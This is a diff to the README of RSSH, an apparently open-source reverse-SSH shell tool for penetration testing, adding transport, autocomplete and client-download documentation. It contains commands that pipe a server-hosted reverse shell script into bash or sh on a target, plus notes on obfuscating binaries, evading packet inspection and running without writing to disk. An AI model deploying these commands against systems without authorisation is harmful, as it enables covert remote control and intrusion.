@@ -8,6 +8,7 @@ Want to use SSH for reverse shells? Now you can.
 - Dynamic, local and remote forwarding
 - Native `SCP` and `SFTP` implementations for retrieving files from your targets
 - Full windows shell
+- Multiple network transports, such as `http`, `websockets`, `tls` and more
 - Mutual client & server authentication to create high trust control channels
 And more!
 
@@ -43,7 +44,9 @@ And more!
     - [Basic Usage](#basic-usage)
   - [Fancy Features](#fancy-features)
     - [Automatic connect-back](#automatic-connect-back)
-    - [Client Generation (and HTTP server)](#client-generation-and-http-server)
+    - [Reverse shell download (client generation and in-built HTTP server)](#reverse-shell-download-client-generation-and-in-built-http-server)
+    - [Alternate Transports (HTTP/Websockets/TLS)](#alternate-transports-httpwebsocketstls)
+    - [Bash autocomplete](#bash-autocomplete)
     - [Windows DLL Generation](#windows-dll-generation)
     - [SSH Subsystems](#ssh-subsystems)
       - [All](#all)
@@ -87,7 +90,9 @@ http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25
 
 
 # curl or wget this binary to a target system then execute it,
-# we can then list what clients are connected
+curl http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25.sh |  bash
+
+# then we can then list what clients are connected
 catcher$ ls
                                  Targets
 +------------------------------------------+-----------------------------------+
@@ -139,7 +144,7 @@ $ bin/client
 $ bin/client -d example.com:3232
 ```
 
-### Client Generation (and HTTP server)
+### Reverse shell download (client generation and in-built HTTP server)
 
 The RSSH server can build and host client binaries (`link` command). Which is the preferred method for building and serving clients.
 For function to work the server must be placed in the project `bin/` folder, as it needs to find the client source.
@@ -147,7 +152,6 @@ For function to work the server must be placed in the project `bin/` folder, as 
 By default the `docker` release has this all built properly, and is recommended for use
 
 ```sh
-
 ssh your.rssh.server.internal -p 3232
 
 catcher$ link -h
@@ -167,6 +171,8 @@ This requires the web server component has been enabled.
 	--tls	Use TLS as the underlying transport
 	--ws	Use plain http websockets as the underlying transport
 	--wss	Use TLS websockets as the underlying transport
+  --http	Use HTTP polling as the underlying transport
+  --https	Use HTTPS polling as the underlying transport
 	--shared-object	Generate shared object file
 	--fingerprint	Set RSSH server fingerprint will default to server public key
 	--garble	Use garble to obfuscate the binary (requires garble to be installed)
@@ -190,6 +196,63 @@ chmod +x test
 The RSSH server also supports `.sh`, and `.py` URL path endings which will generate a script you can pipe into an intepreter:
 ```sh
 curl http://your.rssh.server.internal:3232/test.sh | sh
+```
+
+### Alternate Transports (HTTP/Websockets/TLS)
+The reverse SSH server and client both support multiple transports for when deep packet inspection blocks SSH outbound from a host or network. 
+You can either specify the connect back scheme manually by specifying it as a url in the client. 
+
+E.g
+```sh
+./client -d ws://your.rssh.server:3232
+```
+
+Or by baking it in with the `link` command. 
+```
+ssh your.rssh.server -p 3232 link --ws --name test
+```
+
+### Bash autocomplete
+
+The RSSH server has the `autocomplete` command which integrates nicely with bash so that you can have autocompletions when not using the server console. 
+To install them you simply do:
+
+```sh
+ssh your.rssh.server.internal -p 3232 autocomplete --shell-completion your.rssh.server.internal:3232
+```
+
+And this will return an autocompletion that can be added to your `.zshrc` or `.bashrc`
+
+E.g
+
+```sh
+_RSSHCLIENTSCOMPLETION()
+{
+    local cur=${COMP_WORDS[COMP_CWORD]}
+    COMPREPLY=( $(compgen -W "$(ssh your.rssh.server.internal -p 3232 autocomplete --clients)" -- $cur) )
+}
+
+_RSSHFUNCTIONSCOMPLETIONS()
+{
+    local cur=${COMP_WORDS[COMP_CWORD]}
+    COMPREPLY=( $(compgen -W "$(ssh your.rssh.server.internal -p 3232 help -l)" -- $cur) )
+}
+
+complete -F _RSSHFUNCTIONSCOMPLETIONS ssh your.rssh.server.internal -p 3232 
+
+complete -F _RSSHCLIENTSCOMPLETION ssh -J your.rssh.server.internal:3232
+
+complete -F _RSSHCLIENTSCOMPLETION ssh your.rssh.server.internal:3232 exec 
+complete -F _RSSHCLIENTSCOMPLETION ssh your.rssh.server.internal:3232 connect 
+complete -F _RSSHCLIENTSCOMPLETION ssh your.rssh.server.internal:3232 listen -c 
+complete -F _RSSHCLIENTSCOMPLETION ssh your.rssh.server.internal:3232 kill 
+```
+
+Enabling you to do completions straight from your terminal:
+
+```sh
+# Will give you an option based on what clients are connected
+ssh -J your.rssh.server.internal:3232 <TAB>
 ```
 
 ### Windows DLL Generation
@@ -311,14 +374,13 @@ The rssh server will serve content from the `downloads` directory in the executa
 
 Both of these methods will opportunistically use [memfd](https://man7.org/linux/man-pages/man2/memfd_create.2.html) which will not write any executables to disk.
 
-
 # Help
 
 ## Windows and SFTP
 
 Due to the limitations of SFTP (or rather the library Im using for it). Paths need a little more effort on windows.
 
-```
+```sh
 sftp -r -J your.rssh.server.internal:3232 test-pc.user.test-pc:'/C:/Windows/system32'
 ```
 
@@ -337,8 +399,8 @@ By default, clients will run in the background then the parent process will exit
 
 The easiest way to give back to the RSSH project is by finding bugs, opening feature requests and word-of-mouth advertising it to people you think will find it useful!
 
-However, if you want to give something back to me, you can do so either throught Kofi (under "Sponsor this Project" on the right hand side).
-Or donate to me directly by sending to the either of the following wallets:
+However, if you want to give something back to me directly, you can do so either through Kofi or Github Sponsors (under "Sponsor this Project" on the right hand side).
+Or donate to me by sending to the either of the following wallets:
 
 Monero (XMR):
 `8A8TRqsBKpMMabvt5RxMhCFWcuCSZqGV5L849XQndZB4bcbgkenH8KWJUXinYbF6ySGBznLsunrd1WA8YNPiejGp3FFfPND`
